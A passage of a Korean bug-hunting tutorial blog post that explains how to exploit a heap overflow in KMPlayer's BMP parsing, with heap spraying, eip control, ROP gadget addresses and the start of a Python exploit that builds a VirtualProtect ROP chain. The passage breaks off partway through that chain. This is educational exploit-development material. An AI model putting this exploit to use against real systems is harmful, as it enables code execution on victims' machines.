&#xC774; &#xBD80;&#xBD84;&#xC774; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;!!! &#xC65C;&#xB0D0;&#xD558;&#xBA74; &#xC6B0;&#xB9AC;&#xAC00; &#xB36E;&#xAC8C; &#xB420; &#xAC1D;&#xCCB4;&#xB2C8;&#xAE4C;&#xC694; &#x314E;&#x314E;(&#xC751;? <code>BITMAPINFOHEADER</code>&#xB4A4;&#xC5D0; &#xD560;&#xB2F9;&#xB41C;&#xB2E4;&#xBA70;&#x2026; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0; &#xC548; &#xB09C;&#xB2E4;&#xBA70;&#x2026;.)</p>
<p>&#xB4A4;&#xC5D0; &#xB354; &#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0; &#x314E;&#x314E;&#x314E;&#x314E;</p>
<p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--054.jpg" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--054.jpg"></p>
<p>&#xC774;&#xC81C;&#xB294; <code>this</code> &#xC5D0; <code>BITMAPINFOHEADER</code> &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xCC38; &#xCC30;&#xC9C0;&#xAC8C; &#xB2E4; &#xB123;&#xB124;&#xC694;.<br>&#xADF8;&#xB9AC;&#xACE0; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0;&#xB294; &#xBAA8;&#xB4E0; &#xBE44;&#xD2B8;&#xB9F5; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xB294; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD560; &#xB54C; &#xC774; &#xBD80;&#xBD84;&#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB97C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E;</p>
<p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--056.jpg" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--056.jpg"></p>
<p>&#xC774;&#xC81C; &#xCDE8;&#xC57D;&#xC810; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4; &#x314E;&#x314E;&#x314E; &#xB4DC;&#xB514;&#xC5B4; &#x314E;&#x314E;</p>
<p>&#xBA3C;&#xC800; &#xC5B4;&#xB5A4; &#xC8FC;&#xC18C;&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;. Header &#xC8FC;&#xC18C; &#xAE30;&#xC900;&#xC73C;&#xB85C; <code>size</code> &#xB9CC;&#xD07C; &#xB4A4;&#xC5D0; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C; &#xBC11;&#xC5D0; &#xBAA8;&#xB4E0; &#xBD84;&#xAE30;&#xB97C; &#xAC74;&#xB108;&#xB6F0;&#xACE0; <code>sub_41AAF0</code> &#xD568;&#xC218;&#xB85C; &#xAC11;&#xB2C8;&#xB2E4;. &#xC774; &#xD568;&#xC218;&#xB294; &#xD30C;&#xC77C; &#xC2A4;&#xD2B8;&#xB9BC;&#xC5D0;&#xC11C; <code>byte_4BA6F4[size_bool] * header-&gt;biClrUsed = 0x800</code> &#xB9CC;&#xD07C; &#xC77D;&#xC5B4;&#xC11C; &#xC704;&#xC5D0;&#xC11C; &#xACC4;&#xC0B0;&#xD55C; &#xC8FC;&#xC18C;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p>&#xC5EC;&#xAE30;&#xC5D0;&#xC11C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;!!!! &#xC544;&#xAE4C; &#xC704;&#xC5D0;&#xC11C; &#xC598;&#xAE30;&#xD588;&#xB4EF;&#xC774; header &#xC758; &#xD06C;&#xAE30;&#xB294; <code>size+0x40c</code>&#xC785;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B; &#xADFC;&#xB370; &#xC5EC;&#xAE30;&#xC5D0;&#xC11C;&#xB294; <code>header+size</code> &#xC5D0; <code>0x800</code> &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xB2C8; &#xB4A4;&#xC5D0; &#xC788;&#xB294; &#xAC1D;&#xCCB4;&#xB97C; &#xB36E;&#xAC8C; &#xB418;&#xB294; &#xAC70;&#xC8E0;!! &#xADF8;&#xB7FC; &#xAC1D;&#xCCB4;&#xAC00; &#xB36E;&#xC774;&#xAE30; &#xC804;&#xACFC; &#xD6C4;&#xB97C; &#xD55C;&#xBC88; &#xC0B4;&#xD3B4;&#xBCFC;&#xAC8C;&#xC694;!!</p>
<p>Before:</p>
<p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--058.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--058.png"></p>
<p>After:</p>
<p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--060.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--060.png"></p>
<p>&#xD5E4;&#xD5FF; &#xC790; &#xC774;&#xC81C; &#xADF8;&#xB7FC; <code>eip</code>&#xB97C; &#xC7A1;&#xC744; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;!!!</p>
<p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--062.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--062.png"></p>
<p>&#xB124;&#x2026;.? &#xBB58; &#xC7A1;&#xB294;&#xB2E4;&#xB294; &#xAC70;&#xC8E0;&#x2026;.? &#xC96C;&#xB975;&#x2026;. &#x3160;&#x3160; &#xD6C4;&#xC6B0; &#xC5ED;&#xC2DC; &#xC778;&#xC0DD;&#xC740; &#xD5D8;&#xB09C;&#xD558;&#xB124;&#xC694;&#x2026;</p>
<p>&#xC73C;&#xC74C;&#x2026; &#xC774;&#xC81C; &#xB514;&#xBC84;&#xAE45;&#xD574;&#xBCF4;&#xBA74;&#xC11C; &#xD558;&#xB098;&#xD558;&#xB098; &#xD574;&#xACB0;&#xD574; &#xB098;&#xAC08;&#xAC8C;&#xC694; &#x3160;&#x3160;<br>&#xBA3C;&#xC800; <code>0x11111111</code> &#xC5D0; Access violation&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC6B0;&#xB9AC;&#xAC00; &#xB123;&#xC740; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC720;&#xD6A8;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xD558;&#xBA74; &#xB418;&#xACA0;&#xC8E0;!! &#xD558;&#xC9C0;&#xB9CC;!!! ASLR&#xC774; &#xAC78;&#xB824;&#xC788;&#xC5B4;&#xC11C; &#xADF8;&#xB807;&#xAC8C; &#xD558;&#xB294; &#xAC8C; &#xC27D;&#xC9C0; &#xC54A;&#xB2E4;&#xB294; &#xAC70;&#x2026;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB97C; &#xC9C4;&#xD589;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xB2E4;&#xD589;&#xD788;(??) KMPlayer&#xC640; ImLoader&#xAC00; 32 &#xBE44;&#xD2B8;&#xB85C; &#xCEF4;&#xD30C;&#xC77C;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB97C; &#xD558;&#xBA74; &#xC5B4;&#xB290; &#xC815;&#xB3C4; &#xB9B4;&#xB77C;&#xC774;&#xC5B4;&#xBE14;&#xD558;&#xAC8C; &#xC6D0;&#xD558;&#xB294; &#xC8FC;&#xC18C;&#xC5D0; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xB9E4;&#xD551;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD560;&#xB2F9;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xD06C;&#xAE30;&#xC5D0; &#xB530;&#xB77C;&#xC11C; &#xC790;&#xC8FC; &#xB9E4;&#xD551;&#xB418;&#xB294; &#xC8FC;&#xC18C;&#xAC00; &#xB2EC;&#xB77C;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC800;&#xB294; &#xC5EC;&#xAE30;&#xC5D0;&#xC11C; 150M &#xC815;&#xB3C4;&#xB97C; 0x11&#xB85C; &#xC2A4;&#xD504;&#xB808;&#xC774; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
<p>150M&#xB85C; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xD55C; &#xC774;&#xC720;&#xB294; &#xB514;&#xBC84;&#xAE45;&#xD560; &#xB54C; &#xC774; &#xC815;&#xB3C4; &#xD06C;&#xAE30;&#xAC00; &#xAC00;&#xC7A5; &#xC801;&#xB2F9;&#xD55C; &#xC18D;&#xB3C4;&#xAC00; &#xB098;&#xC640;&#xC11C; &#xC778;&#xB370;&#xC694;. &#xB514;&#xBC84;&#xAE45;&#xD560; &#xB54C; <code>0x11111111</code> &#xC5D0; &#xB9E4;&#xD551;&#xC774; &#xC548;&#xB418;&#xBA74; &#xB2E4;&#xC2DC; &#xC2DC;&#xC791;&#xD574;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD574;&#xC57C; &#xB418;&#xC796;&#xC544;&#xC694;? &#xD06C;&#xAE30;&#xAC00; &#xCEE4;&#xC9C0;&#xBA74; &#xC6D0;&#xD558;&#xB294; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xC774; &#xB354; &#xC798;&#xB418;&#xC9C0;&#xB9CC; &#xC708;&#xB3C4;&#xC6B0;&#xAC00; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xD558;&#xBA74; &#xD560;&#xC218;&#xB85D; &#xB79C;&#xB364; &#xB9C8;&#xC774;&#xC9D5;&#xC774; &#xC798;&#xB3FC;&#xC11C; &#xD06C;&#xAE30;&#xAC00; &#xCEE4;&#xB3C4; &#xC798; &#xC548;&#xB418;&#xB354;&#xB77C;&#xACE0;&#xC694; &#x3160;&#x3160;(&#xC608;&#xC804;&#xC5D0;&#xB294; 300M &#xB9CC; &#xD574;&#xB3C4; &#xAC70;&#xC758; &#xACE0;&#xC815;&#xC774;&#xB77C;&#xACE0; &#xB4E4;&#xC5C8;&#xB294;&#xB370;&#x2026;) &#xAC00;&#xC7A5; &#xD6A8;&#xC728;&#xC801;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xD06C;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xC6D0;&#xD558;&#xB294; &#xB370;&#xB85C; &#xC798; &#xB41C;&#xB2E4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xC5D0; &#xC798; &#xB9E4;&#xD551;&#xB41C; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!!</p>
<p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--064.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--064.png"></p>
<p>&#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xD558;&#xBA74;!!!</p>
<p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--066.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--066.png"></p>
<p>&#xC9DD;&#xC9DD;&#xC9DD;!! <code>eip</code>&#xB97C; &#xC7A1;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;!!! &#xC18C;&#xB9AC;&#xC9C8;&#xB7EC;&#xC5B4;&#xC5B4;&#xC5B4;&#xC5B4;&#xC5B4;&#xC5B4;!!!! (&#xD558;&#x2026; &#xD5D8;&#xB09C;&#xD588;&#xB2E4;&#x2026;) &#xC774;&#xC81C; &#xC775;&#xC2A4;&#xB9CC; &#xD558;&#xBA74; &#xB418;&#xACA0;&#xB124;&#xC694; &#x314E;&#x314E;&#x314E;</p>
<hr>
<p>&#xC77C;&#xB2E8; &#xC5B4;&#xB5BB;&#xAC8C; <code>eip</code>&#xB97C; &#xC7A1;&#xAC8C; &#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD568; &#xBCFC;&#xAC8C;&#xC694;. &#xC77C;&#xB2E8; &#xC2A4;&#xD0DD;&#xC5D0; &#xC788;&#xB294; &#xB9AC;&#xD134; &#xC5B4;&#xB4DC;&#xB808;&#xC2A4;&#xB97C; &#xD655;&#xC778;&#xD574;&#xC11C; &#xC5B4;&#xB514;&#xC5D0;&#xC11C; <code>call</code> &#xD639;&#xC740; <code>jmp</code>&#xB97C; &#xD588;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAC8C;&#xC694;.</p>
<p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--068.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--068.png"></p>
<p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--070.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--070.png"></p>
<p>&#xC2A4;&#xD0DD;&#xC5D0; &#xC788;&#xB294; &#xB9C8;&#xC9C0;&#xB9C9; &#xB9AC;&#xD134; &#xC5B4;&#xB4DC;&#xB808;&#xC2A4;&#xB97C; &#xBCF4;&#xB2C8; <code>ImLoader+0x357f</code> &#xC778; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC774; &#xC8FC;&#xC18C;&#xBCF4;&#xB2E4; &#xC704;&#xC5D0; &#xC788;&#xB294; instruction&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; <code>call dword ptr [ecx-4]</code>&#xC778; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>ecx</code>&#xB294; <code>eax</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC628; &#xAC83;&#xC774;&#xB124;&#xC694;.</p>
<p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--072.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--072.png"></p>
<p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xC911;&#xC694;&#xD55C; &#xAC70;&#xB294; <code>0x11111111</code> &#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD30C;&#xC77C;&#xC5D0;&#xC11C;&#xC758; &#xC624;&#xD504;&#xC14B;(&#xC704;&#xCE58;??)&#xC774; <code>eax</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xB370;&#xC774;&#xD130;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC774; &#xC77C;&#xCE58;&#xD558;&#xB0D0;&#xB294; &#xAC83;&#xC778;&#xB370;&#xC694;. &#xC774; &#xBD80;&#xBD84;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xC77C;&#xB2E8; <code>0x11111111</code> &#xBD80;&#xBD84;&#xC774; &#xC5B4;&#xB5A4; &#xC704;&#xCE58;&#xC5D0; &#xC788;&#xB294;&#xC9C0; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--074.jpg" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--074.jpg"></p>
<p>&#xB9C8;&#xC9C0;&#xB9C9; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xC804;&#xCCB4; &#xBE44;&#xD2B8;&#xB9F5; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xB294; &#xBD80;&#xBD84;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xACC4;&#xC0B0;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. <code>0x11111111 &#x2013; 0x101cb056 = 0xF460BB</code> &#xB124;&#xC694;. &#xC55E;&#xC5D0;&#xC11C; &#xAC1D;&#xCCB4;&#xB97C; &#xB36E;&#xC744; &#xB54C;&#xC5D0;&#xB294; &#xD30C;&#xC77C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC55E;&#xBD80;&#xBD84; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAC00;&#xC838;&#xC640; &#xBCF5;&#xC0AC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xB2F4;&#xB294; &#xB370;&#xC5D0;&#xB294; &#xD070; &#xBB38;&#xC81C;&#xAC00; &#xC5C6;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!!</p>
<p>&#xC790; &#xC774;&#xC81C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xAE30; &#xC804;&#xC5D0; MONA&#xC640; &#xBA54;&#xD0C0;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xBAA8;&#xB4C8;&#xB4E4;&#xC758; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158; &#xC801;&#xC6A9; &#xD56D;&#xBAA9;, &#xD544;&#xC694;&#xD55C; &#xAC00;&#xC82F; &#xAC80;&#xC0C9;, &#xC258; &#xCF54;&#xB4DC; &#xC0DD;&#xC131;&#xC744; &#xD574;&#xC57C; &#xD558;&#xB294; &#xB370; &#xC774; &#xBD80;&#xBD84;&#xC740; &#xC778;&#xD130;&#xB137;&#xC744; &#xAC80;&#xC0C9;&#xD558;&#xBA74; &#xB9CE;&#xC774; &#xB098;&#xC624;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC0DD;&#xB7B5;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACB0;&#xB860;&#xC801;&#xC73C;&#xB85C; <code>KMPlayer.exe</code> &#xC5D0; Rebase&#xAC00; &#xC548; &#xAC78;&#xB824;&#xC788;&#xC5B4;&#xC11C; <code>KMPlayer.exe</code> &#xC5D0; &#xC788;&#xB294; &#xAC00;&#xC82F;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xD560; &#xAC83;&#xC774;&#xACE0;&#xC694;, &#xBA54;&#xD0C0;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD1B5;&#xD574;&#xC11C;&#xB294; &#xACC4;&#xC0B0;&#xAE30;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xB294; &#xC258; &#xCF54;&#xB4DC;&#xB97C; &#xB9CC;&#xB4E4; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p>
<p>&#xC77C;&#xB2E8; ASLR&#xC740; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB85C; &#xC5B4;&#xB290; &#xC815;&#xB3C4; &#xCEE4;&#xBC84;&#xD558;&#xC600;&#xACE0; DEP&#xB9CC; &#xBB34;&#xB825;&#xD654;&#xC2DC;&#xD0A4;&#xACE0; &#xC258; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. DEP&#xB97C; &#xBB34;&#xB825;&#xD654;&#xD558;&#xB824;&#xBA74; ROP&#xB97C; &#xD574;&#xC57C;&#xC8E0;!! &#xC774;&#xC81C; <code>esp</code>&#xB97C; &#xC6B0;&#xB9AC; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC788;&#xB294; &#xD799; &#xBA54;&#xBAA8;&#xB9AC;&#xB85C; &#xD53C;&#xBD07; &#xC2DC;&#xD0AC; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC74C; &#xC801;&#xB2F9;&#xD55C; &#xAC00;&#xC82F;&#xC744; &#xCC3E;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;.</p>
<pre><code class="hljs c"><span class="hljs-number">0x00523702</span> : # PUSH ECX # POP ESP # POP ESI # POP EBX # RETN</code></pre>
<p>&#xC77C;&#xBD80;&#xB85C; &#xB450; &#xBC88; &#xB354; <code>POP</code> &#xD574;&#xC8FC;&#xB294; &#xC774;&#xC720;&#xB294; &#xC704;&#xC5D0; &#xBCF4;&#xC2DC;&#xB2E4;&#xC2DC;&#xD53C; <code>0x11111111</code> &#xBD80;&#xBD84;&#xC5D0; 8 &#xBC14;&#xC774;&#xD2B8;&#xAC00; &#xB2E4;&#xB978; &#xB370;&#xC774;&#xD130;&#xB85C; &#xB36E;&#xC5EC; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774; 8 &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xB6F0;&#xC5B4;&#xB118;&#xACE0; &#xB9AC;&#xD134;&#xD558;&#xAE30; &#xC704;&#xD568;&#xC785;&#xB2C8;&#xB2E4;.</p>
<p>&#xC790; &#xADF8;&#xB7EC;&#xBA74; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD560; &#xB54C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xD558;&#xBA74; &#xB418;&#xACA0;&#xB124;&#xC694;.</p>
<p>&#xC81C;&#xC77C; &#xCC98;&#xC74C; &#xBD80;&#xBD84;&#xC5D0;&#xB294; &#xC704; &#xAC00;&#xC82F;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xAC81;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xBC14;&#xB85C; &#xADF8; &#xB4A4;&#xC5D0;&#xB294; &#xB610; &#xD53C;&#xBD07; &#xD558;&#xB294; &#xAC00;&#xC82F;&#xC744; &#xB123;&#xC5B4;&#xC904; &#xAC81;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xADF8;&#xB0E5; &#xD799;&#xC5D0;&#xC11C;&#xB9CC;&#xC694;. &#xC65C;&#xB0D0;&#xD558;&#xBA74; &#xC774;&#xBC88;&#xC5D0;&#xB294; <code>0x101cb056</code> &#xC5D0; &#xB9E4;&#xD551;&#xC774; &#xB418;&#xC5C8;&#xC9C0;&#xB9CC; &#xB2E4;&#xC74C;&#xC5D0; &#xB610; &#xC774; &#xC5B8;&#xC800;&#xB9AC; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xB420; &#xB54C;&#xB3C4; &#xC774; &#xC8FC;&#xC18C;&#xB77C;&#xB294; &#xBCF4;&#xC7A5;&#xC774; &#xC5C6;&#xC73C;&#xB2C8;&#xAE50;&#xC694;. &#xCD5C;&#xC18C;&#xD55C; &#xD558;&#xC704; 2 &#xBC14;&#xC774;&#xD2B8;&#xB294; &#xBC14;&#xB00C;&#xACA0;&#xC8E0;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>esp</code>&#xB97C; &#xC2A4;&#xD0DD;&#xC5D0;&#xC11C; &#xD799;&#xC73C;&#xB85C;, &#xB2E4;&#xC2DC; &#xD799;&#xC5D0;&#xC11C; &#xB2E4; &#xB192;&#xC740; &#xC8FC;&#xC18C;&#xC758; &#xD799;&#xC73C;&#xB85C; &#xD53C;&#xBD07; &#xD558;&#xB294; &#xAC00;&#xC82F; &#xB450; &#xAC1C;&#xB97C; &#xC2A4;&#xD504;&#xB808;&#xC774; &#xD574;&#xC904; &#xAC81;&#xB2C8;&#xB2E4;. &#xD799;&#xC5D0;&#xC11C; &#xD799;&#xC73C;&#xB85C; &#xD53C;&#xBD07; &#xD558;&#xB294; &#xAC00;&#xC82F;&#xC740; &#xC544;&#xB798; &#xAC78;&#xB85C; &#xC4F0;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;.</p>
<pre><code class="hljs c"><span class="hljs-number">0x0095dffa</span> : # ADD ESP,<span class="hljs-number">19010</span> # POP EBP # POP EDI # POP ESI # POP EBX # RETN</code></pre>
<p>&#xADF8;&#xB9AC;&#xACE0; &#xC911;&#xAC04;&#xC911;&#xAC04;&#xC5D0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xD799;&#xC744; &#xC4F0;&#xB2E4;&#xAC00; &#xBC14;&#xAFBC; &#xBA54;&#xBAA8;&#xB9AC;&#xB4E4;&#xC744; &#xC2A4;&#xD0B5;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC544;&#xB798; &#xAC00;&#xC82F;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c"><span class="hljs-number">0x00433712</span> : # POP EDX # POP EDI # POP ESI # POP EBX # RETN</code></pre>
<p>&#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xC81C; &#xB192;&#xC740; &#xC8FC;&#xC18C;&#xB85C; &#xD53C;&#xBD07; &#xD588;&#xC73C;&#xBA74; &#xADF8; &#xBD80;&#xBD84;&#xC5D0;&#xB3C4; <code>ret</code>&#xC73C;&#xB85C; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB97C; &#xD574;&#xC8FC;&#xBA74; &#xC880; &#xB354; &#xC815;&#xD655;&#xB3C4;&#xAC00; &#xB192;&#xC544;&#xC9C0;&#xACA0;&#xB124;&#xC694; &#x314E;&#x314E;</p>
<p>&#xADF8;&#xB7FC; &#xD30C;&#xC77C;&#xC744; &#xAD6C;&#xC131;&#xD560; &#xB54C;&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xD558;&#xBA74; &#xB418;&#xACA0;&#xB124;&#xC694;</p>
<p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/Untitled.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/Untitled.png"></p>
<p>&#xC544;&#xB798;&#xB294; &#xC81C;&#xAC00; &#xC791;&#xC131;&#xD55C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack, unpack
<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> OrderedDict

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_rop_chain</span>():</span>
	<span class="hljs-comment"># rop chain generated with mona.py - www.corelan.be</span>
	rop_gadgets = [
	<span class="hljs-number">0x00453c50</span>, <span class="hljs-comment"># POP EDX # RETN [KMPlayer.exe]</span>
	<span class="hljs-number">0x00d6a848</span>, <span class="hljs-comment"># ptr to &amp;VirtualProtect() [IAT KMPlayer.exe]</span>
	<span class="hljs-number">0x0094eb72</span>, <span class="hljs-comment"># MOV EAX,DWORD PTR DS:[EDX] # RETN [KMPlayer.exe]</span>
	<span class="hljs-number">0x007d2499</span>, <span class="hljs-comment"># XCHG EAX,ESI # RETN [KMPlayer.exe]</span>
	<span class="hljs-number">0x00652cb0</span>, <span class="hljs-comment"># POP EBP # RETN [KMPlayer.exe]</span>
	<span class="hljs-number">0x0042390c</span>, <span class="hljs-comment"># &amp; jmp esp [KMPlayer.exe]</span>
	<span class="hljs-number">0x004c0267</span>, <span class="hljs-comment"># POP EBX # RETN [KMPlayer.exe]</span>
	<span class="hljs-number">0x00000201</span>, <span class="hljs-comment"># 0x00000201-&gt; ebx</span>
	<span class="hljs-number">0x0052d95d</span>, <span class="hljs-comment"># POP EDX # RETN [KMPlayer.exe]</span>
	<span class="hljs-number">0x00000040</span>, <span class="hljs-comment"># 0x00000040-&gt; edx</span>
	<span class="hljs-number">0x0082f8e0</span>, <span class="hljs-comment"># POP ECX # RETN [KMPlayer.exe]</span>
	<span class="hljs-number">0x00d0aafc</span>, <span class="hljs-comment"># &amp;Writable location [KMPlayer.exe]</span>
	<span class="hljs-number">0x009fc414</span>, <span class="hljs-comment"># POP EDI # RETN [KMPlayer.exe]</span>
	<span class="hljs-number">0x00426485</span>, <span class="hljs-comment"># RETN (ROP NOP) [KMPlayer.exe]</span>
